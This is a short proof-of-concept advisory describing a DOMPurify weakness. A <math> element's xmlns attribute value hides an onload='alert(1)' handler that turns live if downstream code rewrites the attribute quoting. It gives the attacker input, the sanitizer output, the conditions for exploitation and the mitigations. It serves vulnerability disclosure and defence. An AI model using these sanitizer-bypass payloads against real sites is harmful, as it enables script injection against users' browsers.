PoC: DOMPurify xmlns Attribute Value Injection

Finding: mxss_taxonomy_v2 / 0001_critical_xss

Affected: DOMPurify (tested via JSDOM)

Category: Sanitizer Weakness / mXSS Adjacent Pattern

1. Vulnerability Description

DOMPurify allows a <math> element with a crafted xmlns attribute that embeds an event handler pattern within the attribute value using mixed quote styles:

<math xmlns="http://www.w3.org/1998/Mat' onload='h/MathML">

The attribute value contains single-quoted segments that, if the outer quoting is ever changed from double to single quotes by any downstream processing, would cause the browser to parse onload as a separate attribute:

<math xmlns='http://www.w3.org/1998/Mat' onload='h/MathML'>

2. Attack Vector

Attacker Input:
  <math xmlns="http://www.w3.org/1998/Mat' onload='alert(1)//">...</math>

DOMPurify Output (double-quoted = safe):
  <math xmlns="http://www.w3.org/1998/Mat' onload='alert(1)//">

If downstream converts to single quotes (EXPLOITABLE):
  <math xmlns='http://www.w3.org/1998/Mat' onload='alert(1)//'>

4. Conditions for Exploitation

  • Server-side template engine that re-serializes attributes with single quotes
  • Custom HTML serializer/pretty-printer that normalizes quote style
  • Proxy or WAF that modifies attribute quoting
  • SSR framework that re-renders sanitized HTML with different quoting conventions

5. Mitigation

  • DOMPurify should reject or sanitize xmlns values containing embedded quotes + event handler patterns
  • Never change attribute quoting style of sanitized HTML output
  • Use CSP headers as defense-in-depth
